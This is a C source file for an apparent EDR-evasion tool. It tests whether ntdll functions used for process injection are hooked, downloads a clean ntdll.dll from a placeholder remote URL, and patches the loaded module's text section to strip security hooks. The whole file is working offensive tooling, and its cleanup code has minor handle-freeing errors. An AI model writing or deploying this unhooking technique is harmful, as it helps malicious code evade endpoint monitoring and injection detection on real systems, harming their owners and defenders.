#include "NtdllPatcher.h"

#pragma comment(lib, "wininet")

BOOL DownloadFileFromUrl(IN PWCHAR wHost, OUT PVOID* Buffer, OUT PDWORD BufferSize)
{
	HINTERNET	hInternet = NULL;
	HINTERNET	hInternetFile = NULL;
	DWORD		BytesRead = 0;
	BOOL		Result = TRUE;

	hInternet = InternetOpenW(L"EXAMPLE", NULL, NULL, NULL, NULL);
	if (!hInternet) {
		printf("[-] InternetOpenW Failed With: %d\n", GetLastError());
		Result = FALSE;
		goto __Cleanup;
	}

	hInternetFile = InternetOpenUrlW(hInternet, wHost, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (!hInternetFile) {
		printf("[-] InternetOpenUrlW Failed With: %d\n", GetLastError());
		Result = FALSE;
		goto __Cleanup;
	}


	*Buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);
	*BufferSize = 0;
	if (*Buffer == NULL) {
		printf("[-] HeapAlloc Failed\n");
		Result = FALSE;
		goto __Cleanup;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, (PBYTE)*Buffer + *BufferSize, 1024, &BytesRead)) {
			printf("[-] InternetReadFile Failed With: %d\n", GetLastError());
			Result = FALSE;
			goto __Cleanup;
		}

		if (!BytesRead) {
			break;
		}

		*BufferSize += BytesRead;

		*Buffer = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *Buffer, *BufferSize + 1024);
		if (*Buffer == NULL) {
			printf("[-] HeapReAlloc Failed\n");
			Result = FALSE;
			goto __Cleanup;
		}
	}
	return (Result);

__Cleanup:

	if (*Buffer) HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, *Buffer);
	if (hInternet) CloseHandle(hInternet);
	if (hInternetFile) CloseHandle(hInternetFile);

	return (Result);
}

int main()
{
	HANDLE	hNtdll = NULL;
	PVOID	Buffer = NULL;
	DWORD	BufferSize = NULL;
	WCHAR	wHost[] = L"https://<host>/ntdll.dll";

	hNtdll = GetModuleHandleW(L"Ntdll");
	if (IsHooked(hNtdll, "NtOpenProcess") || IsHooked(hNtdll, "NtWriteVirtualMemory") ||
		IsHooked(hNtdll, "NtAllocateVirtualMemory") || IsHooked(hNtdll, "NtCreateThreadEx"))
	{
		puts("[!] One Of The Used API is Hooked");
		puts("[*] Press <ENTER> To Patch Ntdll");
		getchar();

		// Download Ntdll From Remote Server
		if (!DownloadFileFromUrl(wHost, &Buffer, &BufferSize)) {
			wprintf(L"Failed To Download Ntdll From %s\n", wHost);
			goto __Cleanup;
		}

		// Patch Ntdll Text Section
		if (!NtdllPatcher(hNtdll, Buffer)) {
			puts("[-] Failed to Patch Ntdll");
			goto __Cleanup;
		}
	}

	puts("[+] You're Good To Go!");
	getchar();

__Cleanup:
	if (Buffer) HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Buffer);

	return (0);
}
